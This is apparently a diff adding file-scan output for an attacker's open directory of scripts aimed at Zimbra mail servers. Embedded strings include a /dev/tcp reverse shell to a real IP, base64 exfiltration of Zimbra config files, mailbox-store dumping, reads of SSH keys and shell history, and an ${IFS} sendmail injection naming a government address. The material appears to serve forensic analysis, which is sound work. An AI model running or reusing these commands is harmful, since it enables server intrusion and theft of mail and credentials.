@@ -1,0 +1,2161 @@
+
+Scan Time:     2026-09-29 18:40:11
+Target File:   /home/derek/Opendir/ade4.sh
+MD5 Checksum:  d4af47803372cf73ebae493b2c8fc9da
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+
+
+Scan Time:     2026-09-29 18:40:11
+Target File:   /home/derek/Opendir/adenum.py
+MD5 Checksum:  9305fb8a9d9281b7f5a74ce2d250e948
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/usr/bin/env python3"
+2             0x2             Unix path: /usr/bin/env python3
+
+
+Scan Time:     2026-09-29 18:40:11
+Target File:   /home/derek/Opendir/ade.sh
+MD5 Checksum:  57568e64168184be37ab7a410a492575
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+
+
+Scan Time:     2026-09-29 18:40:11
+Target File:   /home/derek/Opendir/atx.b64
+MD5 Checksum:  e1836118532aae77c3103abdaa9d027b
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+
+
+Scan Time:     2026-09-29 18:40:11
+Target File:   /home/derek/Opendir/b80c.sh
+MD5 Checksum:  4a52abcb9f621bec5cbfc7505d5b5267
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+
+
+Scan Time:     2026-09-29 18:40:11
+Target File:   /home/derek/Opendir/b80efo.sh
+MD5 Checksum:  fda679fe413426fa9953f36afcfd06b6
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+
+
+Scan Time:     2026-09-29 18:40:11
+Target File:   /home/derek/Opendir/b80kr.sh
+MD5 Checksum:  c33a6508d3f70d2fb2aeed1e72624043
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+
+
+Scan Time:     2026-09-29 18:40:11
+Target File:   /home/derek/Opendir/b80lv.sh
+MD5 Checksum:  031017d719b971621bf91441a571d1a6
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+
+
+Scan Time:     2026-09-29 18:40:11
+Target File:   /home/derek/Opendir/b.sh
+MD5 Checksum:  91de2a5728a9a8f25d2bc5711b5d02d4
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+
+
+Scan Time:     2026-09-29 18:40:11
+Target File:   /home/derek/Opendir/cronadd.sh
+MD5 Checksum:  8a8f468a55dfd37dd9123de1969a6d22
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+
+
+Scan Time:     2026-09-29 18:40:11
+Target File:   /home/derek/Opendir/daspray.py
+MD5 Checksum:  36c57ef799861d3745fd3a06aa887c9d
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/usr/bin/env python3"
+2             0x2             Unix path: /usr/bin/env python3
+
+
+Scan Time:     2026-09-29 18:40:11
+Target File:   /home/derek/Opendir/dbgwalk.py
+MD5 Checksum:  176d9c945195acfd32400f550e400e8f
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/usr/bin/env python3"
+2             0x2             Unix path: /usr/bin/env python3
+
+
+Scan Time:     2026-09-29 18:40:11
+Target File:   /home/derek/Opendir/dc_spray.txt
+MD5 Checksum:  689884cb7ffd23389def3bbaef62cea9
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+
+
+Scan Time:     2026-09-29 18:40:11
+Target File:   /home/derek/Opendir/dd_nkr2.sh
+MD5 Checksum:  1a2b9efb3063b084e17426401fdde0f4
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+392           0x188           Unix path: /opt/zimbra/bin
+847           0x34F           Unix path: /opt/zimbra/conf/localconfig.xml ] && base64 -w0 /opt/zimbra/conf/localconfig.xml | post "nkr_lc2"
+951           0x3B7           Unix path: /opt/zimbra/conf/nginx/includes/nginx.conf.mail ] && base64 -w0 /opt/zimbra/conf/nginx/includes/nginx.conf.mail | post "nkr_ng"
+1084          0x43C           Unix path: /opt/zimbra/postfix/conf/master.cf ] && head -60 /opt/zimbra/postfix/conf/master.cf | post "nkr_mcf"
+
+
+Scan Time:     2026-09-29 18:40:11
+Target File:   /home/derek/Opendir/dd_nkr.sh
+MD5 Checksum:  77724bcbfb5fe5abc9d5b9ed0c6a333d
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+333           0x14D           Unix path: /opt/zimbra/bin
+
+
+Scan Time:     2026-09-29 18:40:11
+Target File:   /home/derek/Opendir/dd_spz.sh
+MD5 Checksum:  dd404f191f2535627083d52955d1bc7d
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+392           0x188           Unix path: /opt/zimbra/bin
+847           0x34F           Unix path: /opt/zimbra/conf/localconfig.xml ] && base64 -w0 /opt/zimbra/conf/localconfig.xml | post "spz_lc2"
+951           0x3B7           Unix path: /opt/zimbra/conf/nginx/includes/nginx.conf.mail ] && base64 -w0 /opt/zimbra/conf/nginx/includes/nginx.conf.mail | post "spz_ng"
+1084          0x43C           Unix path: /opt/zimbra/postfix/conf/master.cf ] && head -60 /opt/zimbra/postfix/conf/master.cf | post "spz_mcf"
+
+
+Scan Time:     2026-09-29 18:40:11
+Target File:   /home/derek/Opendir/diag.sh
+MD5 Checksum:  17db6d75f2b8894f9faa40e3a38d03d4
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+
+
+Scan Time:     2026-09-29 18:40:11
+Target File:   /home/derek/Opendir/diagx.sh
+MD5 Checksum:  fb25d9c3c687f2d10aa749a08462550a
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+
+
+Scan Time:     2026-09-29 18:40:11
+Target File:   /home/derek/Opendir/edrfo2.sh
+MD5 Checksum:  322a454e7c926fd463b28b3ca4a04443
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+324           0x144           Unix path: /opt/zimbra/common/bin/curl
+
+
+Scan Time:     2026-09-29 18:40:11
+Target File:   /home/derek/Opendir/edrfo.sh
+MD5 Checksum:  91a75b27bb96af34a0174b20a283b2f6
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+377           0x179           Unix path: /opt/zimbra/common/bin/curl
+
+
+Scan Time:     2026-09-29 18:40:11
+Target File:   /home/derek/Opendir/efio2.sh
+MD5 Checksum:  6d56ddfde0845e2c4bcc0a5df3c4f03d
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+
+
+Scan Time:     2026-09-29 18:40:11
+Target File:   /home/derek/Opendir/efio3.sh
+MD5 Checksum:  1ef8fc20b15637cb4af7a803f5f0a3d6
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+324           0x144           Unix path: /opt/zimbra/log
+
+
+Scan Time:     2026-09-29 18:40:11
+Target File:   /home/derek/Opendir/efio4.sh
+MD5 Checksum:  09169176a15ee98c0499c0a0e9dc83e9
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+324           0x144           Unix path: /opt/zimbra/log
+
+
+Scan Time:     2026-09-29 18:40:11
+Target File:   /home/derek/Opendir/efodq80.sh
+MD5 Checksum:  7bb62c476a761e7b37d6acb56430084f
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+778           0x30A           Unix path: /dev/tcp/131.123.43.239/4433 0>&1" &); fi
+1003          0x3EB           Unix path: /opt/zimbra/log/.map ] && wc -l < /opt/zimbra/log/.map 2>/dev/null || echo NO )
+
+
+Scan Time:     2026-09-29 18:40:11
+Target File:   /home/derek/Opendir/efoio2.sh
+MD5 Checksum:  6d56ddfde0845e2c4bcc0a5df3c4f03d
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+
+
+Scan Time:     2026-09-29 18:40:11
+Target File:   /home/derek/Opendir/efoq80.sh
+MD5 Checksum:  78f226cecaf9c7c1f37467e60a2862e2
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+410           0x19A           Unix path: /opt/zimbra/log
+571           0x23B           Unix path: /opt/zimbra/bin/zmprov -l gaa 2>/dev/null | grep -v -x -f <(awk "{print \$1}" $L/.map) > /tmp/.todo
+703           0x2BF           Unix path: /opt/zimbra/bin/zmprov gmi "$a" 2>/dev/null | awk "/mailboxId/{print \$2}")
+1065          0x429           Unix path: /opt/zimbra/store/0/$id" ] || { echo "$id" >> $L/.doj; return 0; }
+1244          0x4DC           Unix path: /opt/zimbra/store/0 "$id" 2>/dev/null | $GZ -1 | split -b 150m - /tmp/C_${id}_ 2>/dev/null
+
+
+Scan Time:     2026-09-29 18:40:11
+Target File:   /home/derek/Opendir/efox.sh
+MD5 Checksum:  961df74207eff7b282ec5bc584e3eb4c
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+624           0x270           Unix path: /opt/zimbra/store/0 2>/dev/null | head -5; ls /opt/zimbra/store/0 2>/dev/null | wc -l
+726           0x2D6           Unix path: /opt/zimbra/bin/zmprov -l gaa 2>/dev/null | wc -l
+1128          0x468           Unix path: /opt/zimbra/log/.qq3m ]; then touch /opt/zimbra/log/.qq3m 2>/dev/null
+1836          0x72C           Unix path: /var/spool/cron 2>/dev/null; cat /etc/cron.d/* 2>/dev/null
+1922          0x782           Unix path: /opt/zimbra/.ssh 2>/dev/null; cat /opt/zimbra/.ssh/zimbra_identity* /opt/zimbra/.ssh/authorized_keys /opt/zimbra/.ssh/id* 2>/dev
+2342          0x926           Unix path: /opt/zimbra/.bash_history /home/*/.bash_history 2>/dev/null | tail -400
+2449          0x991           Unix path: /opt/zimbra/bin/zmlocalconfig -s' 2>/dev/null || sudo -u zimbra /opt/zimbra/bin/zmlocalconfig -s 2>/dev/null || /opt/zimbra/bin/
+
+
+Scan Time:     2026-09-29 18:40:11
+Target File:   /home/derek/Opendir/ex.py
+MD5 Checksum:  b775fa43f480e7379381fc42f0e2a237
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+
+
+Scan Time:     2026-09-29 18:40:11
+Target File:   /home/derek/Opendir/faststream.sh
+MD5 Checksum:  eb67ae2cefba1284ebbc92a6f2a92878
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+
+
+Scan Time:     2026-09-29 18:40:11
+Target File:   /home/derek/Opendir/fetch.py
+MD5 Checksum:  c6c858a45728c5968359083c86b1fdd6
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/usr/bin/env python3"
+2             0x2             Unix path: /usr/bin/env python3
+
+
+Scan Time:     2026-09-29 18:40:11
+Target File:   /home/derek/Opendir/fget.sh
+MD5 Checksum:  b205d5540c758d455717b82ba4489ec1
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+
+
+Scan Time:     2026-09-29 18:40:11
+Target File:   /home/derek/Opendir/ftpw1.py
+MD5 Checksum:  ca28f527f3b3ae68474766248f262451
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/usr/bin/env python3"
+2             0x2             Unix path: /usr/bin/env python3
+
+
+Scan Time:     2026-09-29 18:40:11
+Target File:   /home/derek/Opendir/ghr.sh
+MD5 Checksum:  d598627d91e045f639bdfb210be6bcf9
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+
+
+Scan Time:     2026-09-29 18:40:11
+Target File:   /home/derek/Opendir/gh.sh
+MD5 Checksum:  fb6d73ed8ad6055e83770fe187dc7337
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+468           0x1D4           Unix path: /opt/zimbra/common/sbin/sendmail${IFS}admin@pl.dbr.gov.ua'
+611           0x263           Unix path: /opt/zimbra/common/sbin/sendmail${IFS}admin@pl.dbr.gov.ua'
+
+
+Scan Time:     2026-09-29 18:40:11
+Target File:   /home/derek/Opendir/gpph2.py
+MD5 Checksum:  6c9fc546ee387de420c766adfb75620a
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/usr/bin/env python3"
+2             0x2             Unix path: /usr/bin/env python3
+
+
+Scan Time:     2026-09-29 18:40:11
+Target File:   /home/derek/Opendir/gpph.py
+MD5 Checksum:  269295538ab99a812eb5df67edf22cc7
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/usr/bin/env python3"
+2             0x2             Unix path: /usr/bin/env python3
+
+
+Scan Time:     2026-09-29 18:40:11
+Target File:   /home/derek/Opendir/hp1.sh
+MD5 Checksum:  0e1d2a8019240e1fbdc49355cffa4140
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+979           0x3D3           Unix path: /var/lib/postfix -type f 2>/dev/null | head -60; echo ==SAMPLES==; find / -xdev \( -iname "*.eml" -o -iname "*.msg" -o -iname "*
+
+
+Scan Time:     2026-09-29 18:40:11
+Target File:   /home/derek/Opendir/identity_pl
+MD5 Checksum:  5e81da1d7fc99719c260d61b8049b8e9
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             PEM RSA private key
+
+
+Scan Time:     2026-09-29 18:40:11
+Target File:   /home/derek/Opendir/imp.zip
+MD5 Checksum:  a6b5615ff921ea02c3c3332929268150
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Zip archive data, at least v2.0 to extract, compressed size: 8491, uncompressed size: 34703, name: six.py
+8527          0x214F          Zip archive data, at least v2.0 to extract, compressed size: 2948, uncompressed size: 13492, name: impacket/cdp.py
+11520         0x2D00          Zip archive data, at least v2.0 to extract, compressed size: 18234, uncompressed size: 92746, name: impacket/smb3.py
+29800         0x7468          Zip archive data, at least v2.0 to extract, compressed size: 3743, uncompressed size: 15147, name: impacket/winregistry.py
+33596         0x833C          Zip archive data, at least v2.0 to extract, compressed size: 8306, uncompressed size: 39537, name: impacket/dpapi.py
+41949         0xA3DD          Zip archive data, at least v2.0 to extract, compressed size: 13496, uncompressed size: 66343, name: impacket/ImpactPacket.py
+55499         0xD8CB          Zip archive data, at least v2.0 to extract, compressed size: 30125, uncompressed size: 159879, name: impacket/smb.py
+85669         0x14EA5         Zip archive data, at least v2.0 to extract, compressed size: 910, uncompressed size: 2837, name: impacket/pcapfile.py
+86629         0x15265         Zip archive data, at least v2.0 to extract, compressed size: 2951, uncompressed size: 14753, name: impacket/spnego.py
+89628         0x15E1C         Zip archive data, at least v2.0 to extract, compressed size: 1693, uncompressed size: 6637, name: impacket/IP6.py
+91366         0x164E6         Zip archive data, at least v2.0 to extract, compressed size: 53307, uncompressed size: 316482, name: impacket/mapi_constants.py
+144729        0x23559         Zip archive data, at least v2.0 to extract, compressed size: 432, uncompressed size: 746, name: impacket/version.py
+145210        0x2373A         Zip archive data, at least v2.0 to extract, compressed size: 1344, uncompressed size: 4319, name: impacket/helper.py
+146602        0x23CAA         Zip archive data, at least v2.0 to extract, compressed size: 3479, uncompressed size: 12469, name: impacket/mqtt.py
+150127        0x24A6F         Zip archive data, at least v2.0 to extract, compressed size: 122634, uncompressed size: 588944, name: impacket/hresult_errors.py
+272817        0x429B1         Zip archive data, at least v2.0 to extract, compressed size: 9154, uncompressed size: 46450, name: impacket/smbconnection.py
+282026        0x44DAA         Zip archive data, at least v2.0 to extract, compressed size: 15363, uncompressed size: 111873, name: impacket/dot11.py
+297436        0x489DC         Zip archive data, at least v2.0 to extract, compressed size: 2320, uncompressed size: 6868, name: impacket/dhcp.py
+299802        0x4931A         Zip archive data, at least v2.0 to extract, compressed size: 3797, uncompressed size: 19508, name: impacket/ICMP6.py
+303646        0x4A21E         Zip archive data, at least v2.0 to extract, compressed size: 12220, uncompressed size: 59626, name: impacket/tds.py
+315911        0x4D207         Zip archive data, at least v2.0 to extract, compressed size: 5189, uncompressed size: 22862, name: impacket/structure.py
+321151        0x4E67F         Zip archive data, at least v2.0 to extract, compressed size: 2569, uncompressed size: 10955, name: impacket/IP6_Extension_Headers.py
+323783        0x4F0C7         Zip archive data, at least v2.0 to extract, compressed size: 461, uncompressed size: 777, name: impacket/__init__.py
+324294        0x4F2C6         Zip archive data, at least v2.0 to extract, compressed size: 696, uncompressed size: 1447, name: impacket/eap.py
+325035        0x4F5AB         Zip archive data, at least v2.0 to extract, compressed size: 555, uncompressed size: 1577, name: impacket/Dot11KeyManager.py
+325647        0x4F80F         Zip archive data, at least v2.0 to extract, compressed size: 83661, uncompressed size: 390038, name: impacket/nt_errors.py
+409359        0x63F0F         Zip archive data, at least v2.0 to extract, compressed size: 2540, uncompressed size: 9719, name: impacket/IP6_Address.py
+411952        0x64930         Zip archive data, at least v2.0 to extract, compressed size: 116226, uncompressed size: 578104, name: impacket/system_errors.py
+528233        0x80F69         Zip archive data, at least v2.0 to extract, compressed size: 4930, uncompressed size: 33296, name: impacket/ImpactDecoder.py
+533218        0x822E2         Zip archive data, at least v2.0 to extract, compressed size: 1617, uncompressed size: 6515, name: impacket/NDP.py
+534880        0x82960         Zip archive data, at least v2.0 to extract, compressed size: 8336, uncompressed size: 36933, name: impacket/ese.py
+543261        0x84A1D         Zip archive data, at least v2.0 to extract, compressed size: 1396, uncompressed size: 5319, name: impacket/pcap_linktypes.py
+544713        0x84FC9         Zip archive data, at least v2.0 to extract, compressed size: 9339, uncompressed size: 41616, name: impacket/ntlm.py
+554098        0x87472         Zip archive data, at least v2.0 to extract, compressed size: 8204, uncompressed size: 45279, name: impacket/smb3structs.py
+562355        0x894B3         Zip archive data, at least v2.0 to extract, compressed size: 3353, uncompressed size: 11158, name: impacket/wps.py
+565753        0x8A1F9         Zip archive data, at least v2.0 to extract, compressed size: 35226, uncompressed size: 221670, name: impacket/smbserver.py
+601030        0x92BC6         Zip archive data, at least v2.0 to extract, compressed size: 494, uncompressed size: 1105, name: impacket/Dot11Crypto.py
+601577        0x92DE9         Zip archive data, at least v2.0 to extract, compressed size: 8840, uncompressed size: 35585, name: impacket/nmb.py
+610462        0x9509E         Zip archive data, at least v2.0 to extract, compressed size: 3395, uncompressed size: 13649, name: impacket/crypto.py
+613905        0x95E11         Zip archive data, at least v2.0 to extract, compressed size: 2167, uncompressed size: 7688, name: impacket/http.py
+616118        0x966B6         Zip archive data, at least v2.0 to extract, compressed size: 1217, uncompressed size: 3055, name: impacket/uuid.py
+617381        0x96BA5         Zip archive data, at least v2.0 to extract, compressed size: 6267, uncompressed size: 26527, name: impacket/dns.py
+623693        0x9844D         Zip archive data, at least v2.0 to extract, compressed size: 150149, uncompressed size: 462225, name: impacket/__pycache__/hresult_errors.cpython-311.pyc
+773923        0xBCF23         Zip archive data, at least v2.0 to extract, compressed size: 4580, uncompressed size: 10144, name: impacket/__pycache__/http.cpython-311.pyc
+778574        0xBE14E         Zip archive data, at least v2.0 to extract, compressed size: 18765, uncompressed size: 46932, name: impacket/__pycache__/nmb.cpython-311.pyc
+797409        0xC2AE1         Zip archive data, at least v2.0 to extract, compressed size: 35864, uncompressed size: 92893, name: impacket/__pycache__/smb3.cpython-311.pyc
+833344        0xCB740         Zip archive data, at least v2.0 to extract, compressed size: 14044, uncompressed size: 44123, name: impacket/__pycache__/smb3structs.cpython-311.pyc
+847466        0xCEE6A         Zip archive data, at least v2.0 to extract, compressed size: 526, uncompressed size: 870, name: impacket/__pycache__/__init__.cpython-311.pyc
+848067        0xCF0C3         Zip archive data, at least v2.0 to extract, compressed size: 2033, uncompressed size: 3939, name: impacket/__pycache__/uuid.cpython-311.pyc
+850171        0xCF8FB         Zip archive data, at least v2.0 to extract, compressed size: 16247, uncompressed size: 39817, name: impacket/__pycache__/ntlm.cpython-311.pyc
+866489        0xD38B9         Zip archive data, at least v2.0 to extract, compressed size: 18580, uncompressed size: 59137, name: impacket/__pycache__/smbconnection.cpython-311.pyc
+885149        0xD819D         Zip archive data, at least v2.0 to extract, compressed size: 100710, uncompressed size: 306836, name: impacket/__pycache__/nt_errors.cpython-311.pyc
+985935        0xF0B4F         Zip archive data, at least v2.0 to extract, compressed size: 140919, uncompressed size: 415704, name: impacket/__pycache__/system_errors.cpython-311.pyc
+1126934       0x113216        Zip archive data, at least v2.0 to extract, compressed size: 6535, uncompressed size: 18750, name: impacket/__pycache__/spnego.cpython-311.pyc
+1133542       0x114BE6        Zip archive data, at least v2.0 to extract, compressed size: 4773, uncompressed size: 11439, name: impacket/__pycache__/crypto.cpython-311.pyc
+1138388       0x115ED4        Zip archive data, at least v2.0 to extract, compressed size: 58309, uncompressed size: 162463, name: impacket/__pycache__/smb.cpython-311.pyc
+1196767       0x1242DF        Zip archive data, at least v2.0 to extract, compressed size: 12267, uncompressed size: 31324, name: impacket/__pycache__/structure.cpython-311.pyc
+1209110       0x127316        Zip archive data, at least v2.0 to extract, compressed size: 7, uncompressed size: 5, name: impacket/ldap/__init__.py
+1209172       0x127354        Zip archive data, at least v2.0 to extract, compressed size: 4232, uncompressed size: 25973, name: impacket/ldap/ldapasn1.py
+1213459       0x128413        Zip archive data, at least v2.0 to extract, compressed size: 4096, uncompressed size: 16132, name: impacket/ldap/ldaptypes.py
+1217611       0x12944B        Zip archive data, at least v2.0 to extract, compressed size: 6730, uncompressed size: 27299, name: impacket/ldap/ldap.py
+1224392       0x12AEC8        Zip archive data, at least v2.0 to extract, compressed size: 7, uncompressed size: 5, name: impacket/dcerpc/__init__.py
+1224456       0x12AF08        Zip archive data, at least v2.0 to extract, compressed size: 120, uncompressed size: 153, name: impacket/dcerpc/__pycache__/__init__.cpython-311.pyc
+1224658       0x12AFD2        Zip archive data, at least v2.0 to extract, compressed size: 4632, uncompressed size: 20694, name: impacket/dcerpc/v5/transport.py
+1229351       0x12C227        Zip archive data, at least v2.0 to extract, compressed size: 13215, uncompressed size: 92717, name: impacket/dcerpc/v5/nrpc.py
+1242622       0x12F5FE        Zip archive data, at least v2.0 to extract, compressed size: 9520, uncompressed size: 43572, name: impacket/dcerpc/v5/drsuapi.py
+1252201       0x131B69        Zip archive data, at least v2.0 to extract, compressed size: 3191, uncompressed size: 13382, name: impacket/dcerpc/v5/dtypes.py
+1255450       0x13281A        Zip archive data, at least v2.0 to extract, compressed size: 4861, uncompressed size: 34109, name: impacket/dcerpc/v5/dhcpm.py
+1260368       0x133B50        Zip archive data, at least v2.0 to extract, compressed size: 13432, uncompressed size: 89840, name: impacket/dcerpc/v5/srvs.py
+1273856       0x137000        Zip archive data, at least v2.0 to extract, compressed size: 2319, uncompressed size: 7402, name: impacket/dcerpc/v5/mimilib.py
+1276234       0x13794A        Zip archive data, at least v2.0 to extract, compressed size: 8242, uncompressed size: 44519, name: impacket/dcerpc/v5/scmr.py
+1284532       0x1399B4        Zip archive data, at least v2.0 to extract, compressed size: 10811, uncompressed size: 67508, name: impacket/dcerpc/v5/ndr.py
+1295398       0x13C426        Zip archive data, at least v2.0 to extract, compressed size: 4931, uncompressed size: 23130, name: impacket/dcerpc/v5/tsch.py
+1300385       0x13D7A1        Zip archive data, at least v2.0 to extract, compressed size: 14021, uncompressed size: 96968, name: impacket/dcerpc/v5/samr.py
+1314462       0x140E9E        Zip archive data, at least v2.0 to extract, compressed size: 2888, uncompressed size: 12396, name: impacket/dcerpc/v5/even.py
+1317406       0x141A1E        Zip archive data, at least v2.0 to extract, compressed size: 26750, uncompressed size: 94384, name: impacket/dcerpc/v5/epm.py
+1344211       0x1482D3        Zip archive data, at least v2.0 to extract, compressed size: 7480, uncompressed size: 38454, name: impacket/dcerpc/v5/nspi.py
+1351747       0x14A043        Zip archive data, at least v2.0 to extract, compressed size: 8743, uncompressed size: 57690, name: impacket/dcerpc/v5/lsad.py
+1360546       0x14C2A2        Zip archive data, at least v2.0 to extract, compressed size: 7, uncompressed size: 5, name: impacket/dcerpc/v5/__init__.py
+1360613       0x14C2E5        Zip archive data, at least v2.0 to extract, compressed size: 1498, uncompressed size: 5211, name: impacket/dcerpc/v5/mgmt.py
+1362167       0x14C8F7        Zip archive data, at least v2.0 to extract, compressed size: 4589, uncompressed size: 19790, name: impacket/dcerpc/v5/rprn.py
+1366812       0x14DB1C        Zip archive data, at least v2.0 to extract, compressed size: 5808, uncompressed size: 34818, name: impacket/dcerpc/v5/wkst.py
+1372676       0x14F204        Zip archive data, at least v2.0 to extract, compressed size: 2005, uncompressed size: 6820, name: impacket/dcerpc/v5/atsvc.py
+1374738       0x14FA12        Zip archive data, at least v2.0 to extract, compressed size: 1638, uncompressed size: 6233, name: impacket/dcerpc/v5/sasec.py
+1376433       0x1500B1        Zip archive data, at least v2.0 to extract, compressed size: 8552, uncompressed size: 32109, name: impacket/dcerpc/v5/rpch.py
+1385041       0x152251        Zip archive data, at least v2.0 to extract, compressed size: 2618, uncompressed size: 16070, name: impacket/dcerpc/v5/lsat.py
+1387715       0x152CC3        Zip archive data, at least v2.0 to extract, compressed size: 11618, uncompressed size: 66733, name: impacket/dcerpc/v5/dcomrt.py
+1399391       0x155A5F        Zip archive data, at least v2.0 to extract, compressed size: 1303, uncompressed size: 4391, name: impacket/dcerpc/v5/oxabref.py
+1400753       0x155FB1        Zip archive data, at least v2.0 to extract, compressed size: 5392, uncompressed size: 30668, name: impacket/dcerpc/v5/rrp.py
+1406200       0x1574F8        Zip archive data, at least v2.0 to extract, compressed size: 2396, uncompressed size: 9626, name: impacket/dcerpc/v5/even6.py
+1408653       0x157E8D        Zip archive data, at least v2.0 to extract, compressed size: 16062, uncompressed size: 72126, name: impacket/dcerpc/v5/rpcrt.py
+1424772       0x15BD84        Zip archive data, at least v2.0 to extract, compressed size: 7330, uncompressed size: 27891, name: impacket/dcerpc/v5/enum.py
+1432158       0x15DA5E        Zip archive data, at least v2.0 to extract, compressed size: 1701, uncompressed size: 4745, name: impacket/dcerpc/v5/bkrp.py
+1433915       0x15E13B        Zip archive data, at least v2.0 to extract, compressed size: 31332, uncompressed size: 136234, name: impacket/dcerpc/v5/__pycache__/srvs.cpython-311.pyc
+1465328       0x165BF0        Zip archive data, at least v2.0 to extract, compressed size: 12278, uncompressed size: 33849, name: impacket/dcerpc/v5/__pycache__/transport.cpython-311.pyc
+1477692       0x168C3C        Zip archive data, at least v2.0 to extract, compressed size: 31809, uncompressed size: 78477, name: impacket/dcerpc/v5/__pycache__/rpcrt.cpython-311.pyc
+1509583       0x1708CF        Zip archive data, at least v2.0 to extract, compressed size: 123, uncompressed size: 156, name: impacket/dcerpc/v5/__pycache__/__init__.cpython-311.pyc
+1509791       0x17099F        Zip archive data, at least v2.0 to extract, compressed size: 32852, uncompressed size: 125903, name: impacket/dcerpc/v5/__pycache__/samr.cpython-311.pyc
+1542724       0x178A44        Zip archive data, at least v2.0 to extract, compressed size: 12133, uncompressed size: 31233, name: impacket/dcerpc/v5/__pycache__/rpch.cpython-311.pyc
+1554938       0x17B9FA        Zip archive data, at least v2.0 to extract, compressed size: 13242, uncompressed size: 29526, name: impacket/dcerpc/v5/__pycache__/enum.cpython-311.pyc
+1568261       0x17EE05        Zip archive data, at least v2.0 to extract, compressed size: 7406, uncompressed size: 21839, name: impacket/dcerpc/v5/__pycache__/dtypes.cpython-311.pyc
